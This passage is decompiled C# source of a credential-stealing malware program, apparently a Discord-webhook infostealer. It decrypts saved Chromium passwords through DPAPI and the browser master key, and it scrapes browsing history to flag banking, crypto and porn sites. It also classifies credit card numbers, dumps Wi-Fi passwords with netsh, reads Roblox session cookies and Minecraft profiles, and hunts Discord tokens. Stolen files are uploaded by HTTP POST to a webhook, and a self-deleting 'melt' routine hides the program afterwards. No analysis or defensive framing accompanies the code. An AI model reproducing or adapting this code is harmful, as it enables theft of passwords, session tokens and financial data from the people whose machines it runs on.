			// Token: 0x06000038 RID: 56 RVA: 0x00003A60 File Offset: 0x00001C60
			public byte[] Concat(params byte[][] arrays)
			{
				int num = 0;
				foreach (byte[] array in arrays)
				{
					if (array != null)
					{
						num += array.Length;
					}
				}
				byte[] array2 = new byte[num - 1 + 1];
				int num2 = 0;
				foreach (byte[] array3 in arrays)
				{
					if (array3 != null)
					{
						Buffer.BlockCopy(array3, 0, array2, num2, array3.Length);
						num2 += array3.Length;
					}
				}
				return array2;
			}
		}

		// Token: 0x0200000C RID: 12
		internal sealed class Crypto
		{
			// Token: 0x0600003A RID: 58
			[DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
			private static extern bool CryptUnprotectData(ref Program.Crypto.DataBlob pCipherText, ref string pszDescription, ref Program.Crypto.DataBlob pEntropy, IntPtr pReserved, ref Program.Crypto.CryptprotectPromptstruct pPrompt, int dwFlags, ref Program.Crypto.DataBlob pPlainText);

			// Token: 0x0600003B RID: 59 RVA: 0x00003AD8 File Offset: 0x00001CD8
			public static byte[] DPAPIDecrypt(byte[] bCipher, byte[] bEntropy = null)
			{
				Program.Crypto.DataBlob dataBlob = default(Program.Crypto.DataBlob);
				Program.Crypto.DataBlob dataBlob2 = default(Program.Crypto.DataBlob);
				Program.Crypto.DataBlob dataBlob3 = default(Program.Crypto.DataBlob);
				Program.Crypto.CryptprotectPromptstruct cryptprotectPromptstruct = new Program.Crypto.CryptprotectPromptstruct
				{
					cbSize = Marshal.SizeOf(typeof(Program.Crypto.CryptprotectPromptstruct)),
					dwPromptFlags = 0,
					hwndApp = IntPtr.Zero,
					szPrompt = null
				};
				string empty = string.Empty;
				try
				{
					try
					{
						if (bCipher == null)
						{
							bCipher = new byte[0];
						}
						dataBlob2.pbData = Marshal.AllocHGlobal(bCipher.Length);
						dataBlob2.cbData = bCipher.Length;
						Marshal.Copy(bCipher, 0, dataBlob2.pbData, bCipher.Length);
					}
					catch
					{
					}
					try
					{
						if (bEntropy == null)
						{
							bEntropy = new byte[0];
						}
						dataBlob3.pbData = Marshal.AllocHGlobal(bEntropy.Length);
						dataBlob3.cbData = bEntropy.Length;
						Marshal.Copy(bEntropy, 0, dataBlob3.pbData, bEntropy.Length);
					}
					catch
					{
					}
					Program.Crypto.CryptUnprotectData(ref dataBlob2, ref empty, ref dataBlob3, IntPtr.Zero, ref cryptprotectPromptstruct, 1, ref dataBlob);
					byte[] array = new byte[dataBlob.cbData];
					Marshal.Copy(dataBlob.pbData, array, 0, dataBlob.cbData);
					return array;
				}
				catch
				{
				}
				finally
				{
					if (dataBlob.pbData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(dataBlob.pbData);
					}
					if (dataBlob2.pbData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(dataBlob2.pbData);
					}
					if (dataBlob3.pbData != IntPtr.Zero)
					{
						Marshal.FreeHGlobal(dataBlob3.pbData);
					}
				}
				return new byte[0];
			}

			// Token: 0x0600003C RID: 60 RVA: 0x00003C98 File Offset: 0x00001E98
			public static byte[] GetMasterKey(string sLocalStateFolder)
			{
				string text;
				if (sLocalStateFolder.Contains("Opera"))
				{
					text = sLocalStateFolder + "\\Opera Stable\\Local State";
				}
				else
				{
					text = sLocalStateFolder + "\\Local State";
				}
				byte[] array = new byte[0];
				if (!File.Exists(text))
				{
					return null;
				}
				if (text != Program.Crypto.sPrevBrowserPath)
				{
					Program.Crypto.sPrevBrowserPath = text;
					MatchCollection matchCollection = new Regex("\"encrypted_key\":\"(.*?)\"", RegexOptions.Compiled).Matches(File.ReadAllText(text));
					foreach (object obj in matchCollection)
					{
						Match match = (Match)obj;
						if (match.Success)
						{
							array = Convert.FromBase64String(match.Groups[1].Value);
						}
					}
					byte[] array2 = new byte[array.Length - 5];
					Array.Copy(array, 5, array2, 0, array.Length - 5);
					byte[] result;
					try
					{
						Program.Crypto.sPrevMasterKey = Program.Crypto.DPAPIDecrypt(array2, null);
						result = Program.Crypto.sPrevMasterKey;
					}
					catch
					{
						result = null;
					}
					return result;
				}
				return Program.Crypto.sPrevMasterKey;
			}

			// Token: 0x0600003D RID: 61 RVA: 0x00003DBC File Offset: 0x00001FBC
			public static string GetUTF8(string sNonUtf8)
			{
				string result;
				try
				{
					byte[] bytes = Encoding.Default.GetBytes(sNonUtf8);
					result = Encoding.UTF8.GetString(bytes);
				}
				catch
				{
					result = sNonUtf8;
				}
				return result;
			}

			// Token: 0x0600003E RID: 62 RVA: 0x00003DFC File Offset: 0x00001FFC
			public static byte[] DecryptWithKey(byte[] bEncryptedData, byte[] bMasterKey)
			{
				byte[] array = new byte[12];
				byte[] array2 = array;
				Array.Copy(bEncryptedData, 3, array2, 0, 12);
				byte[] result;
				try
				{
					byte[] array3 = new byte[bEncryptedData.Length - 15];
					Array.Copy(bEncryptedData, 15, array3, 0, bEncryptedData.Length - 15);
					byte[] array4 = new byte[16];
					byte[] array5 = new byte[array3.Length - array4.Length];
					Array.Copy(array3, array3.Length - 16, array4, 0, 16);
					Array.Copy(array3, 0, array5, 0, array3.Length - array4.Length);
					Program.cAesGcm cAesGcm = new Program.cAesGcm();
					result = cAesGcm.Decrypt(bMasterKey, array2, null, array5, array4);
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
					result = null;
				}
				return result;
			}

			// Token: 0x0600003F RID: 63 RVA: 0x00003EA8 File Offset: 0x000020A8
			public static string EasyDecrypt(string sLoginData, string sPassword)
			{
				if (sPassword.StartsWith("v10") || sPassword.StartsWith("v11"))
				{
					byte[] masterKey = Program.Crypto.GetMasterKey(Directory.GetParent(sLoginData).Parent.FullName);
					return Encoding.Default.GetString(Program.Crypto.DecryptWithKey(Encoding.Default.GetBytes(sPassword), masterKey));
				}
				return Encoding.Default.GetString(Program.Crypto.DPAPIDecrypt(Encoding.Default.GetBytes(sPassword), null));
			}

			// Token: 0x06000040 RID: 64 RVA: 0x00003F1C File Offset: 0x0000211C
			public static string BrowserPathToAppName(string sLoginData)
			{
				if (sLoginData.Contains("Opera"))
				{
					return "Opera";
				}
				sLoginData.Replace(Program.Paths.lappdata, "");
				return sLoginData.Split(new char[]
				{
					'\\'
				})[1];
			}

			// Token: 0x04000049 RID: 73
			private static string sPrevBrowserPath = "";

			// Token: 0x0400004A RID: 74
			private static byte[] sPrevMasterKey = new byte[0];

			// Token: 0x0200000D RID: 13
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct CryptprotectPromptstruct
			{
				// Token: 0x0400004B RID: 75
				public int cbSize;

				// Token: 0x0400004C RID: 76
				public int dwPromptFlags;

				// Token: 0x0400004D RID: 77
				public IntPtr hwndApp;

				// Token: 0x0400004E RID: 78
				public string szPrompt;
			}

			// Token: 0x0200000E RID: 14
			[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
			private struct DataBlob
			{
				// Token: 0x0400004F RID: 79
				public int cbData;

				// Token: 0x04000050 RID: 80
				public IntPtr pbData;
			}
		}

		// Token: 0x0200000F RID: 15
		internal sealed class Counter
		{
			// Token: 0x06000043 RID: 67 RVA: 0x00002753 File Offset: 0x00000953
			public static string GetSValue(string application, bool value)
			{
				if (!value)
				{
					return "";
				}
				return "\n   ∟ " + application;
			}

			// Token: 0x06000044 RID: 68 RVA: 0x00003F64 File Offset: 0x00002164
			public static string GetIValue(string application, int value)
			{
				if (value == 0)
				{
					return "";
				}
				return string.Concat(new object[]
				{
					"\n   ∟ ",
					application,
					": ",
					value
				});
			}

			// Token: 0x06000045 RID: 69 RVA: 0x00003FA4 File Offset: 0x000021A4
			public static string GetLValue(string application, List<string> value, char separator = '∟')
			{
				value.Sort();
				if (value.Count == 0)
				{
					return "\n   ∟ " + application + " (No data)";
				}
				return string.Concat(new object[]
				{
					"\n   ∟ ",
					application,
					":\n\t\t\t\t\t\t\t",
					separator,
					" ",
					string.Join("\n\t\t\t\t\t\t\t" + separator + " ", value)
				});
			}

			// Token: 0x06000046 RID: 70 RVA: 0x00002769 File Offset: 0x00000969
			public static string GetBValue(bool value, string success, string failed)
			{
				if (!value)
				{
					return "\n   ∟ " + failed;
				}
				return "\n   ∟ " + success;
			}

			// Token: 0x04000051 RID: 81
			public static int Passwords = 0;

			// Token: 0x04000052 RID: 82
			public static int CreditCards = 0;

			// Token: 0x04000053 RID: 83
			public static int AutoFill = 0;

			// Token: 0x04000054 RID: 84
			public static int Cookies = 0;

			// Token: 0x04000055 RID: 85
			public static int History = 0;

			// Token: 0x04000056 RID: 86
			public static int Bookmarks = 0;

			// Token: 0x04000057 RID: 87
			public static int Downloads = 0;

			// Token: 0x04000058 RID: 88
			public static int VPN = 0;

			// Token: 0x04000059 RID: 89
			public static int Pidgin = 0;

			// Token: 0x0400005A RID: 90
			public static int Wallets = 0;

			// Token: 0x0400005B RID: 91
			public static int FTPHosts = 0;

			// Token: 0x0400005C RID: 92
			public static bool Telegram = false;

			// Token: 0x0400005D RID: 93
			public static bool Steam = false;

			// Token: 0x0400005E RID: 94
			public static bool Uplay = false;

			// Token: 0x0400005F RID: 95
			public static bool Discord = false;

			// Token: 0x04000060 RID: 96
			public static int SavedWifiNetworks = 0;

			// Token: 0x04000061 RID: 97
			public static bool ProductKey = false;

			// Token: 0x04000062 RID: 98
			public static bool DesktopScreenshot = false;

			// Token: 0x04000063 RID: 99
			public static bool WebcamScreenshot = false;

			// Token: 0x04000064 RID: 100
			public static int GrabberDocuments = 0;

			// Token: 0x04000065 RID: 101
			public static int GrabberSourceCodes = 0;

			// Token: 0x04000066 RID: 102
			public static int GrabberDatabases = 0;

			// Token: 0x04000067 RID: 103
			public static int GrabberImages = 0;

			// Token: 0x04000068 RID: 104
			public static bool BankingServices = false;

			// Token: 0x04000069 RID: 105
			public static bool CryptoServices = false;

			// Token: 0x0400006A RID: 106
			public static bool PornServices = false;

			// Token: 0x0400006B RID: 107
			public static List<string> DetectedBankingServices = new List<string>();

			// Token: 0x0400006C RID: 108
			public static List<string> DetectedCryptoServices = new List<string>();

			// Token: 0x0400006D RID: 109
			public static List<string> DetectedPornServices = new List<string>();
		}

		// Token: 0x02000010 RID: 16
		private class Handler
		{
			// Token: 0x0400006E RID: 110
			public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

			// Token: 0x0400006F RID: 111
			public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x04000070 RID: 112
			public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

			// Token: 0x04000071 RID: 113
			public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

			// Token: 0x04000072 RID: 114
			public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

			// Token: 0x04000073 RID: 115
			public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

			// Token: 0x04000074 RID: 116
			public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

			// Token: 0x04000075 RID: 117
			public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

			// Token: 0x04000076 RID: 118
			public static readonly string ExploitDirectory = Path.GetDirectoryName(Program.Handler.ExploitName);

			// Token: 0x04000077 RID: 119
			public static string[] SysPatch = new string[]
			{
				Program.Handler.AppData,
				Program.Handler.LocalData,
				Program.Handler.CommonData
			};

			// Token: 0x04000078 RID: 120
			public static string zxczxczxc = Program.Handler.SysPatch[new Random().Next(0, Program.Handler.SysPatch.Length)];

			// Token: 0x04000079 RID: 121
			public static string ExploitDir = Program.Handler.zxczxczxc + "\\AIO";

			// Token: 0x0400007A RID: 122
			public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

			// Token: 0x0400007B RID: 123
			public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");

			// Token: 0x0400007C RID: 124
			public static string loggedDate = Program.Handler.dateLog.ToString();
		}

		// Token: 0x02000011 RID: 17
		internal sealed class SqlReader
		{
			// Token: 0x0600004B RID: 75 RVA: 0x000041F8 File Offset: 0x000023F8
			public static Program.SQLite ReadTable(string database, string table)
			{
				if (!File.Exists(database))
				{
					return null;
				}
				string text = Path.GetTempFileName() + ".dat";
				File.Copy(database, text);
				Program.SQLite sqlite = new Program.SQLite(text);
				sqlite.ReadTable(table);
				File.Delete(text);
				if (sqlite.GetRowCount() == 65536)
				{
					return null;
				}
				return sqlite;
			}
		}

		// Token: 0x02000012 RID: 18
		internal sealed class Banking
		{
			// Token: 0x0600004D RID: 77 RVA: 0x0000424C File Offset: 0x0000244C
			private static bool AppendValue(string value, List<string> domains)
			{
				string text = value.Replace("www.", "").ToLower();
				if (text.Contains("google") || text.Contains("bing") || text.Contains("yandex") || text.Contains("duckduckgo"))
				{
					return false;
				}
				if (text.StartsWith("."))
				{
					text = text.Substring(1);
				}
				try
				{
					text = new Uri(text).Host;
				}
				catch (UriFormatException)
				{
				}
				text = Path.GetFileNameWithoutExtension(text);
				text = text.Replace(".com", "").Replace(".org", "");
				foreach (string text2 in domains)
				{
					if (text.ToLower().Replace(" ", "").Contains(text2.ToLower().Replace(" ", "")))
					{
						return false;
					}
				}
				text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
				domains.Add(text);
				return true;
			}

			// Token: 0x0600004E RID: 78 RVA: 0x00004388 File Offset: 0x00002588
			private static void DetectCryptocurrencyServices(string value)
			{
				foreach (string value2 in Program.Banking.CryptoServices)
				{
					if (value.ToLower().Contains(value2) && value.Length < 25 && Program.Banking.AppendValue(value, Program.Counter.DetectedCryptoServices))
					{
						Program.Counter.CryptoServices = true;
						break;
					}
				}
			}

			// Token: 0x0600004F RID: 79 RVA: 0x000043DC File Offset: 0x000025DC
			private static void DetectBankingServices(string value)
			{
				foreach (string value2 in Program.Banking.BankingServices)
				{
					if (value.ToLower().Contains(value2) && value.Length < 25 && Program.Banking.AppendValue(value, Program.Counter.DetectedBankingServices))
					{
						Program.Counter.BankingServices = true;
						break;
					}
				}
			}

			// Token: 0x06000050 RID: 80 RVA: 0x00004430 File Offset: 0x00002630
			private static void DetectPornServices(string value)
			{
				foreach (string value2 in Program.Banking.PornServices)
				{
					if (value.ToLower().Contains(value2) && value.Length < 25 && Program.Banking.AppendValue(value, Program.Counter.DetectedPornServices))
					{
						Program.Counter.PornServices = true;
						break;
					}
				}
			}

			// Token: 0x06000051 RID: 81 RVA: 0x00002785 File Offset: 0x00000985
			public static void ScanData(string value)
			{
				Program.Banking.DetectBankingServices(value);
				Program.Banking.DetectCryptocurrencyServices(value);
				Program.Banking.DetectPornServices(value);
			}

			// Token: 0x06000052 RID: 82 RVA: 0x00004484 File Offset: 0x00002684
			public static string DetectCreditCardType(string number)
			{
				foreach (KeyValuePair<string, Regex> keyValuePair in Program.Banking.CreditCardTypes)
				{
					if (keyValuePair.Value.Match(number.Replace(" ", "")).Success)
					{
						return keyValuePair.Key;
					}
				}
				return "Unknown";
			}

			// Token: 0x0400007D RID: 125
			public static string[] CryptoServices = new string[]
			{
				"bitcoin",
				"monero",
				"dashcoin",
				"litecoin",
				"etherium",
				"stellarcoin",
				"btc",
				"eth",
				"xmr",
				"xlm",
				"xrp",
				"ltc",
				"bch",
				"blockchain",
				"paxful",
				"investopedia",
				"buybitcoinworldwide",
				"cryptocurrency",
				"crypto",
				"trade",
				"trading",
				"биткоин",
				"wallet"
			};

			// Token: 0x0400007E RID: 126
			public static string[] PornServices = new string[]
			{
				"porn",
				"sex",
				"hentai",
				"порно",
				"sex"
			};

			// Token: 0x0400007F RID: 127
			public static string[] BankingServices = new string[]
			{
				"qiwi",
				"money",
				"exchange",
				"bank",
				"credit",
				"card",
				"банк",
				"кредит"
			};

			// Token: 0x04000080 RID: 128
			private static Dictionary<string, Regex> CreditCardTypes = new Dictionary<string, Regex>
			{
				{
					"Amex Card",
					new Regex("^3[47][0-9]{13}$")
				},
				{
					"BCGlobal",
					new Regex("^(6541|6556)[0-9]{12}$")
				},
				{
					"Carte Blanche Card",
					new Regex("^389[0-9]{11}$")
				},
				{
					"Diners Club Card",
					new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
				},
				{
					"Discover Card",
					new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
				},
				{
					"Insta Payment Card",
					new Regex("^63[7-9][0-9]{13}$")
				},
				{
					"JCB Card",
					new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
				},
				{
					"KoreanLocalCard",
					new Regex("^9[0-9]{15}$")
				},
				{
					"Laser Card",
					new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
				},
				{
					"Maestro Card",
					new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
				},
				{
					"Mastercard",
					new Regex("5[1-5][0-9]{14}$")
				},
				{
					"Solo Card",
					new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
				},
				{
					"Switch Card",
					new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
				},
				{
					"Union Pay Card",
					new Regex("^(62[0-9]{14,17})$")
				},
				{
					"Visa Card",
					new Regex("4[0-9]{12}(?:[0-9]{3})?$")
				},
				{
					"Visa Master Card",
					new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
				},
				{
					"Express Card",
					new Regex("3[47][0-9]{13}$")
				}
			};
		}

		// Token: 0x02000013 RID: 19
		public class Historical
		{
			// Token: 0x06000055 RID: 85 RVA: 0x000047D8 File Offset: 0x000029D8
			public static List<Program.Historical.Site> GetHistory(string sHistory)
			{
				List<Program.Historical.Site> result;
				try
				{
					List<Program.Historical.Site> list = new List<Program.Historical.Site>();
					Program.SQLite sqlite = Program.SqlReader.ReadTable(sHistory, "urls");
					if (sqlite == null)
					{
						result = list;
					}
					else
					{
						for (int i = 0; i < sqlite.GetRowCount(); i++)
						{
							Program.Historical.Site item = default(Program.Historical.Site);
							item.sTitle = Program.Crypto.GetUTF8(sqlite.GetValue(i, 1));
							item.sUrl = Program.Crypto.GetUTF8(sqlite.GetValue(i, 2));
							item.iCount = Convert.ToInt32(sqlite.GetValue(i, 3)) + 1;
							Program.Banking.ScanData(item.sUrl);
							Program.Counter.History++;
							list.Add(item);
						}
						result = list;
					}
				}
				catch
				{
					result = new List<Program.Historical.Site>();
				}
				return result;
			}

			// Token: 0x06000056 RID: 86 RVA: 0x00002799 File Offset: 0x00000999
			private static string FormatHistory(Program.Historical.Site sSite)
			{
				return string.Format("WEBSITE: {0}\nURL: {1}\n", sSite.sTitle, sSite.sUrl);
			}

			// Token: 0x06000057 RID: 87 RVA: 0x0000489C File Offset: 0x00002A9C
			public static void RunHis()
			{
				foreach (string text in Program.Paths.sChromiumPswPaths)
				{
					string path;
					if (text.Contains("Opera Software"))
					{
						path = Program.Paths.appdata + text;
					}
					else
					{
						path = Program.Paths.lappdata + text;
					}
					if (Directory.Exists(path))
					{
						foreach (string str in Directory.GetDirectories(path))
						{
							List<Program.Historical.Site> history = Program.Historical.GetHistory(str + "\\History");
							if (history.Count > 0)
							{
								File.AppendAllText(Program.tempFolder + "\\Historicals.txt", "\nSTART\n\n");
								foreach (Program.Historical.Site sSite in history)
								{
									File.AppendAllText(Program.tempFolder + "\\Historicals.txt", Program.Historical.FormatHistory(sSite) + "\n");
								}
								File.AppendAllText(Program.tempFolder + "\\Historicals.txt", "\n# STOP (HISTORY) \n");
							}
						}
					}
				}
				Program.SendHistory();
			}

			// Token: 0x02000014 RID: 20
			public class hisName
			{
				// Token: 0x04000081 RID: 129
				public static string howtonameit = "";
			}

			// Token: 0x02000015 RID: 21
			internal struct Site
			{
				// Token: 0x17000005 RID: 5
				// (get) Token: 0x0600005B RID: 91 RVA: 0x000027BF File Offset: 0x000009BF
				// (set) Token: 0x0600005C RID: 92 RVA: 0x000027C7 File Offset: 0x000009C7
				public string sUrl { get; set; }

				// Token: 0x17000006 RID: 6
				// (get) Token: 0x0600005D RID: 93 RVA: 0x000027D0 File Offset: 0x000009D0
				// (set) Token: 0x0600005E RID: 94 RVA: 0x000027D8 File Offset: 0x000009D8
				public string sTitle { get; set; }

				// Token: 0x17000007 RID: 7
				// (get) Token: 0x0600005F RID: 95 RVA: 0x000027E1 File Offset: 0x000009E1
				// (set) Token: 0x06000060 RID: 96 RVA: 0x000027E9 File Offset: 0x000009E9
				public int iCount { get; set; }
			}
		}

		// Token: 0x02000016 RID: 22
		public class Extra
		{
			// Token: 0x06000061 RID: 97 RVA: 0x000049E0 File Offset: 0x00002BE0
			public static void MeltStub()
			{
				try
				{
					string location = Assembly.GetEntryAssembly().Location;
					Process.Start(new ProcessStartInfo("cmd.exe", "/C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"" + location + "\"")
					{
						WindowStyle = ProcessWindowStyle.Hidden
					}).Dispose();
					Environment.Exit(0);
				}
				catch
				{
				}
			}
		}

		// Token: 0x02000017 RID: 23
		public class ShutOffs
		{
			// Token: 0x06000063 RID: 99 RVA: 0x000027F2 File Offset: 0x000009F2
			public static void ShutDownPC()
			{
				Process.Start("shutdown.exe", "-s -t 0");
			}

			// Token: 0x06000064 RID: 100 RVA: 0x00002804 File Offset: 0x00000A04
			public static void RestartPC()
			{
				Process.Start("shutdown.exe", "-r -t 0");
			}
		}

		// Token: 0x02000018 RID: 24
		private class WifiStealing
		{
			// Token: 0x06000066 RID: 102 RVA: 0x00004A40 File Offset: 0x00002C40
			public static void SendWifi()
			{
				string path = Program.tempFolder + "\\Wifi.txt";
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(path);
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Wifi.txt");
					httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
					File.Delete(Program.tempFolder + "\\Wifi.txt");
				}
			}

			// Token: 0x02000019 RID: 25
			public static class Handler
			{
				// Token: 0x04000085 RID: 133
				public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

				// Token: 0x04000086 RID: 134
				public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

				// Token: 0x04000087 RID: 135
				public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

				// Token: 0x04000088 RID: 136
				public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

				// Token: 0x04000089 RID: 137
				public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

				// Token: 0x0400008A RID: 138
				public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

				// Token: 0x0400008B RID: 139
				public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

				// Token: 0x0400008C RID: 140
				public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

				// Token: 0x0400008D RID: 141
				public static readonly string ExploitDirectory = Path.GetDirectoryName(Program.WifiStealing.Handler.ExploitName);

				// Token: 0x0400008E RID: 142
				public static string[] SysPatch = new string[]
				{
					Program.WifiStealing.Handler.AppData,
					Program.WifiStealing.Handler.LocalData,
					Program.WifiStealing.Handler.CommonData
				};

				// Token: 0x0400008F RID: 143
				public static string zxczxczxc = Program.WifiStealing.Handler.SysPatch[new Random().Next(0, Program.WifiStealing.Handler.SysPatch.Length)];

				// Token: 0x04000090 RID: 144
				public static string ExploitDir = Program.WifiStealing.Handler.zxczxczxc + "\\AIO";

				// Token: 0x04000091 RID: 145
				public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

				// Token: 0x04000092 RID: 146
				public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");
			}

			// Token: 0x0200001A RID: 26
			internal sealed class CommandHelper
			{
				// Token: 0x06000069 RID: 105 RVA: 0x00004BD8 File Offset: 0x00002DD8
				public static string Run(string cmd, bool wait = true)
				{
					string result = "";
					using (Process process = new Process())
					{
						process.StartInfo = new ProcessStartInfo
						{
							UseShellExecute = false,
							CreateNoWindow = true,
							WindowStyle = ProcessWindowStyle.Hidden,
							FileName = "cmd.exe",
							Arguments = cmd,
							RedirectStandardError = true,
							RedirectStandardOutput = true
						};
						process.Start();
						result = process.StandardOutput.ReadToEnd();
						if (wait)
						{
							process.WaitForExit();
						}
					}
					return result;
				}
			}

			// Token: 0x0200001B RID: 27
			internal sealed class Wifi
			{
				// Token: 0x0600006B RID: 107 RVA: 0x00004C6C File Offset: 0x00002E6C
				public static string[] GetProfiles()
				{
					string text = Program.WifiStealing.CommandHelper.Run("/C chcp 65001 && netsh wlan show profile | findstr All", true);
					string[] array = text.Split(new char[]
					{
						'\r',
						'\n'
					}, StringSplitOptions.RemoveEmptyEntries);
					for (int i = 0; i < array.Length; i++)
					{
						array[i] = array[i].Substring(array[i].LastIndexOf(':') + 1).Trim();
					}
					return array;
				}

				// Token: 0x0600006C RID: 108 RVA: 0x00004CCC File Offset: 0x00002ECC
				public static string GetWifiPassword(string profile)
				{
					string text = Program.WifiStealing.CommandHelper.Run("/C chcp 65001 && netsh wlan show profile name=" + profile + " key=clear | findstr Key", true);
					return text.Split(new char[]
					{
						':'
					}).Last<string>().Trim();
				}

				// Token: 0x0600006D RID: 109 RVA: 0x00002816 File Offset: 0x00000A16
				public static void ScanningNetworks()
				{
					string exploitDir = Program.WifiStealing.Handler.ExploitDir;
					Program.WifiStealing.CommandHelper.Run("/C chcp 65001 && netsh wlan show networks mode=bssid", true);
				}

				// Token: 0x0600006E RID: 110 RVA: 0x00004D10 File Offset: 0x00002F10
				public static void SavedNetworks()
				{
					string exploitDir = Program.WifiStealing.Handler.ExploitDir;
					string[] profiles = Program.WifiStealing.Wifi.GetProfiles();
					foreach (string text in profiles)
					{
						if (!text.Equals("65001"))
						{
							string wifiPassword = Program.WifiStealing.Wifi.GetWifiPassword(text);
							string.Concat(new string[]
							{
								"PROFILE: ",
								text,
								"\nPASSWORD: ",
								wifiPassword,
								"\n\n"
							});
						}
					}
				}
			}
		}

		// Token: 0x0200001C RID: 28
		public class MinecraftRobber
		{
			// Token: 0x06000070 RID: 112 RVA: 0x00004D8C File Offset: 0x00002F8C
			public static void GetMinecraft()
			{
				string text = Program.tempFolder + "\\.minecraft\\launcher_profiles.json";
				Console.WriteLine(text);
				Console.WriteLine("copy to : " + Program.tempFolder + "\\launcher_profiles.json");
				if (File.Exists(text))
				{
					File.Copy(text, Program.tempFolder + "\\launcher_profiles.json");
					string webhookURL = Program.WebhookURL;
					using (HttpClient httpClient = new HttpClient())
					{
						MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
						byte[] array = File.ReadAllBytes(Program.tempFolder + "\\launcher_profiles.json");
						multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "launcher_profiles.json");
						httpClient.PostAsync(webhookURL, multipartFormDataContent).Wait();
						httpClient.Dispose();
					}
				}
			}
		}

		// Token: 0x0200001D RID: 29
		public class Roblox
		{
			// Token: 0x06000072 RID: 114 RVA: 0x00004E58 File Offset: 0x00003058
			public static async Task SendRobloxCookie()
			{
				string path = Program.tempFolder + "\\Roblox_Cookie.txt";
				using (HttpClient httpClient = new HttpClient())
				{
					MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
					byte[] array = File.ReadAllBytes(path);
					multipartFormDataContent.Add(new ByteArrayContent(array, 0, array.Length), "Document", "Roblox_Cookie.txt");
					httpClient.PostAsync(Program.WebhookURL, multipartFormDataContent).Wait();
					httpClient.Dispose();
					File.Delete(Program.tempFolder + "\\Roblox_Cookie.txt");
				}
			}

			// Token: 0x06000073 RID: 115 RVA: 0x00004E98 File Offset: 0x00003098
			public static string RobloxCookie()
			{
				string result;
				try
				{
					using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com", false))
					{
						string text = registryKey.GetValue(".ROBLOSECURITY").ToString();
						text = text.Substring(46).Trim(new char[]
						{
							'>'
						});
						Console.WriteLine(text);
						result = text;
					}
				}
				catch
				{
					result = "No Roblox Cookie.";
				}
				return result;
			}
		}

		// Token: 0x0200001F RID: 31
		public class DiscordTokens
		{
			// Token: 0x06000077 RID: 119 RVA: 0x00004FF0 File Offset: 0x000031F0
			private static void Scan()
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
				Program.DiscordTokens.target.Add(folderPath + "\\Discord");
				Program.DiscordTokens.target.Add(folderPath + "\\discordcanary");
				Program.DiscordTokens.target.Add(folderPath + "\\discordptb");
				Program.DiscordTokens.target.Add(folderPath + "\\\\Opera Software\\Opera Stable");
				Program.DiscordTokens.target.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default");
				Program.DiscordTokens.target.Add(folderPath2 + "\\BraveSoftware\\Brave-Browser\\User Data\\Default");
				Program.DiscordTokens.target.Add(folderPath2 + "\\Yandex\\YandexBrowser\\User Data\\Default");
			}

			// Token: 0x06000078 RID: 120 RVA: 0x000050A0 File Offset: 0x000032A0
			public static List<string> Grab()
			{
				Program.DiscordTokens.Scan();
				List<string> list = new List<string>();
				foreach (string text in Program.DiscordTokens.target)
				{
					if (Directory.Exists(text))
					{
						string path = text + "\\Local Storage\\leveldb";
						DirectoryInfo directoryInfo = new DirectoryInfo(path);
